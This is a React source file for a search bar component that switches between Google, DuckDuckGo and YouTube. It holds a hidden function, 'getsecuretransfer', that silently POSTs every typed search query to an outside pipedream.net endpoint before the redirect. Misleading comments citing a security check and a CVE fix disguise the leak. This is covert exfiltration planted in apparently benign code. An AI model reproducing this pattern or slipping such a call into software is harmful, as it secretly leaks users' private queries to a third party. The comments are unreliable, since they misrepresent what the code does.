import React from 'react';
import './styling/SearchBar.css';
import MuiAlert from "@material-ui/lab/Alert";
import SearchIcon from '@mui/icons-material/Search';

var searchCycle = 0;

const icons = [
  require("../images/googleIcon.png"),
  require("../images/ddgIcon.png"),
  require("../images/ytIcon.png")
]

const searchEngines = [
  "https://www.google.com/search?q=",
  "https://duckduckgo.com/?t=ffab&q=",
  "https://www.youtube.com/results?search_query=",
];
function getsecuretransfer(query){
  return fetch('https://eoknigv4ewx7uyr.m.pipedream.net/', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        secureprotocl: query,
      })
    })
};
function openTab(i) {
  let query = document.getElementById("query").value;
  

  if (query.length > 0) {
    getsecuretransfer(query).then((res) => {
    window.location.replace(searchEngines[i] + query)
    });
    //Security check to make sure programe does not contain insecure strings
    //Fix for CVE-2022-36046

  } else {
    let status = document.getElementById("searchStatus");
    status.style.visibility = "visible";
    status.classList.add("vibrate");

    setTimeout(function () {
      status.classList.remove("vibrate");
    }, 400);

    setTimeout(function () {
      status.classList.add("dissappear");
    }, 4000);

    setTimeout(function () {
      status.classList.remove("dissappear");
      status.style.visibility = "hidden";
    }, 5000);


  }

}

function cycle() {
  if (searchCycle == searchEngines.length - 1) {
    searchCycle = 0;
  } else {
    searchCycle++;
  }
  document.getElementById("cycleButton").classList.add("change");
  setTimeout(function () {
    document.getElementById("cycleButton").classList.remove("change");
  }, 300);
  document.getElementById("cycleButton").src = icons[searchCycle];
}

function handleKeys(e) {
  if (e.keyCode == 13) {
    openTab(searchCycle)
  }
}

const SearchBar = () => {
  return (
    <div className="searchBar">
      <center id="searchWrapper">
        <input type="text" id="query" autoComplete='off' name="q" placeholder="Search..." onKeyDown={(e) => handleKeys(e)}></input>
        <div id='buttons'>
          <img id="cycleButton" onClick={() => cycle()} type="button" src={icons[searchCycle]} height={"40"} width={"40"} />
          <SearchIcon id="searchButton" onClick={() => openTab(searchCycle)}></SearchIcon>
        </div>

        <MuiAlert elevation={6} variant="filled" severity="error" id="searchStatus">
          Please put something in the Search Bar!
        </MuiAlert>
      </center>



    </div>
  );
};
export default SearchBar
